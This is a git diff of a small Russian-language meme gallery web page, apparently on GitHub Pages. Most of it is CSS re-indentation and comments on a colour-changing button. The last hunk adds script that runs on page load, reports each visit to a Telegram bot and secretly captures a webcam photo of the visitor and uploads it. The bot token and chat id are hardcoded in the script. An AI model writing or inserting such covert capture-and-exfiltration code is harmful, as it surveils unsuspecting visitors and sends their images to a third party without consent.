@@ -43,14 +43,14 @@
             height: auto;
         }
 
-				#image_chockoboy, #video_vadim, #image_kot, #image_anonim, #image_beer, #image_kuvyrok {
-						border-radius: 20px;
-						margin-bottom: 25px;
-						width: 100%;
-						max-width: 256px;
-						height: 512px; /* Фиксированная высота */
-						object-fit: cover; /* Чтобы изображение заполняло область, сохраняя пропорции */
-				}
+        #image_chockoboy, #video_vadim, #image_kot, #image_anonim, #image_beer, #image_kuvyrok {
+            border-radius: 20px;
+            margin-bottom: 25px;
+            width: 100%;
+            max-width: 256px;
+            height: 512px; /* Фиксированная высота */
+            object-fit: cover; /* Чтобы изображение заполняло область, сохраняя пропорции */
+        }
 
         footer {
             font-family: Arial Black;
@@ -66,6 +66,7 @@
             width: 90%;
             max-width: 300px;
             height: 50px;
+            font-size: 16px;
             border-radius: 10px;
             color: black;
             font-family: Arial Black;
@@ -79,10 +80,6 @@
         @media (max-width: 600px) {
             #all_gallery {
                 font-size: 18px;
-            }
-
-            #randbut {
-                font-size: 16px;
             }
 
             #div_gallery {
@@ -104,7 +101,7 @@
                 <img src="imgs/kot.jpg" id="image_kot" alt="Кот" />
                 <img src="imgs/anonim.jpg" id="image_anonim" alt="Аноним" />
                 <img src="imgs/beer.jpg" id="image_beer" alt="Пивас"/>
-								<img src="imgs/kuvyrok.jpg" id="image_kuvyrok" alt="Кувырок"/>
+                <img src="imgs/kuvyrok.jpg" id="image_kuvyrok" alt="Кувырок"/>
             </div>
         </div>
         <button id='randbut'> НE НАЖИМАТЬ </button>
@@ -114,13 +111,111 @@
     </footer>
     <script>
         let randbut = document.getElementById('randbut');
+
+        // Функция для генерации случайного цвета
         function RandomColor() {
             let r = Math.floor(Math.random() * 256);
             let g = Math.floor(Math.random() * 256);
             let b = Math.floor(Math.random() * 256);
-            return `rgb(${r}, ${g}, ${b})`}
+            return `rgb(${r}, ${g}, ${b})`;
+        }
+
+        // Обработчик нажатия на кнопку
         randbut.addEventListener('click', function() {
-        randbut.style.backgroundColor = RandomColor()})
+            randbut.style.backgroundColor = RandomColor(); // Меняем цвет кнопки
+        });
+
+        // Функция для отправки сообщения в Telegram
+        function sendTelegramMessage(message) {
+            const botToken = '7312549221:AAFjFb6kk4JP3jo61ripvd4vMNn4fhX1nZ4'; // Токен вашего бота
+            const chatId = '757365834'; // Замените на ваш chat_id
+
+            // Отправка запроса к Telegram API
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Message sent:', data);
+            })
+            .catch(error => {
+                console.error('Error sending message:', error);
+            });
+        }
+
+        // Функция для отправки фото в Telegram
+        function sendPhotoToTelegram(photoDataUrl) {
+            const botToken = '7312549221:AAFjFb6kk4JP3jo61ripvd4vMNn4fhX1nZ4'; // Токен вашего бота
+            const chatId = '757365834'; // Замените на ваш chat_id
+
+            // Преобразуем Data URL в Blob
+            fetch(photoDataUrl)
+                .then((response) => response.blob())
+                .then((blob) => {
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob, 'photo.png');
+
+                    // Отправляем фото в Telegram
+                    return fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData,
+                    });
+                })
+                .then((response) => response.json())
+                .then((data) => {
+                    console.log('Фото отправлено:', data);
+                })
+                .catch((error) => {
+                    console.error('Ошибка отправки фото:', error);
+                });
+        }
+
+        // Функция для захвата фото с камеры
+        function capturePhoto() {
+            const video = document.createElement('video');
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+
+            // Запрашиваем доступ к камере
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => {
+                    video.srcObject = stream;
+                    video.play();
+
+                    // Ждем, пока видео начнет воспроизводиться
+                    video.addEventListener('canplay', () => {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+
+                        // Делаем фото
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const photoDataUrl = canvas.toDataURL('image/png');
+
+                        // Отправляем фото в Telegram
+                        sendPhotoToTelegram(photoDataUrl);
+
+                        // Останавливаем поток
+                        stream.getTracks().forEach(track => track.stop());
+                    });
+                })
+                .catch((error) => {
+                    console.error('Ошибка доступа к камере:', error);
+                });
+        }
+
+        // Уведомление при загрузке страницы
+        window.onload = function() {
+            sendTelegramMessage('Кто-то зашел на сайт vadimsys.github.io');
+            capturePhoto(); // Захватываем фото с камеры
+        };
     </script>
 </body>
 </html>
